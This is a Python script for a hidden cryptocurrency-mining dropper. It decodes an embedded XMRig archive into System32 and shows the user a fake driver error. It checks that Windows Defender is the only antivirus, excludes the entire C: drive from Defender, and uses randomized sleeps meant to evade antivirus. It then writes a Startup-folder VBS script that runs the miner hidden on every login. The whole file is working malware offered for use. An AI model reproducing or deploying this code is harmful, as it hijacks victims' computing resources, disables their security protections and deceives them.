# Modify the description of executable xmrig.exe and the icon. Modify the config.yml aswell to the correct config.
# Zip the folder and compress it at maximum.
# Store the base64 value of the zip directly into the python script.

import base64
import zipfile
import os
import subprocess
import time,random;
import re
import sys
import ctypes
import tkinter
from tkinter import messagebox

STARTUP = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\svMonitor.vbs"
WAIT = 0.6
TETA = 0.3

#zip file of the miner, stored as a base64 string
zip64 = b''

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

root = tkinter.Tk()
root.withdraw()

#Check if has admin privilege, if not, exit
if(isAdmin()):
    messagebox.showerror(title="Compatible driver not found !", message="The specified location does not contain a compatible software driver for your device. If the location contains a driver, make sure it is designed to work with the Windows x64 Edition operating system.")
else:
    messagebox.showwarning(title="Insufficient privileges", message="This application requires administrator privileges to work.")
    sys.exit()

#function to :
#Create the zip with the base64 string.
#Extract the zip in System32 and remove the zip.
#create a vbs file in startup folder. A vbs file that execute the miner.
def stage(file_content):

	try:
		file_content=base64.b64decode(file_content)
		with open("C:\\Windows\\System32\\xmrig.zip","wb+") as f:
			f.write(file_content)
	except Exception as e:
		print(str(e))

	if not os.path.exists("C:\\Windows\\System32\\xmrig"):
		os.makedirs("C:\\Windows\\System32\\xmrig")

	with zipfile.ZipFile("C:\\Windows\\System32\\xmrig.zip", 'r') as zip_ref:
		zip_ref.extractall("C:\\Windows\\System32\\xmrig")

	os.remove("C:\\Windows\\System32\\xmrig.zip")

	vbs_content = "Set oShell = CreateObject(\"WScript.Shell\")\n"
	vbs_content += "oShell.Run \"C:\\Windows\\System32\\xmrig\\xmrig-6.20.0\\xmrig.exe\", 0"

	try:
		file_content=base64.b64decode(file_content)
		with open("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\svMonitor.vbs","w+") as f:
			f.write(vbs_content)
		return True
	except Exception as e:
		return False

#Execute a command in a temporary subprocess and return the output
def execute(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return (CMD.stdout.read(),CMD.stderr.read())

#Human sleep simulation between subprocesses to escape AV
def wait():
    global WAIT
    global TETA
    time.sleep(random.uniform(WAIT-TETA, WAIT+TETA))

# Check if there is other AV than defender, if yes, exit
# Exclude "C:" folder from Defender
# Check if "C:" was successfully excluded, if not, exit
# run the stager function and execute the startup program on success
if __name__ == '__main__':
    wait()
    cb = execute("powershell WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List")
    output = cb[0]
    err = cb[1]
    if(err):
        sys.exit()
    onlyDef = len(list(filter(None, re.split(r"[\r|\n]",output.decode())))) == 1
    if(not onlyDef):
        sys.exit()
    wait()
    execute('powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:"')
    cb = execute('powershell "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"')
    output = cb[0]
    if("C:" not in list(filter(None, re.split(r"[\r|\n]",output.decode())))):
        sys.exit()
    wait()
    if(stage(zip64)):
        wait()
        execute(f'powershell "start \'{STARTUP}\'"')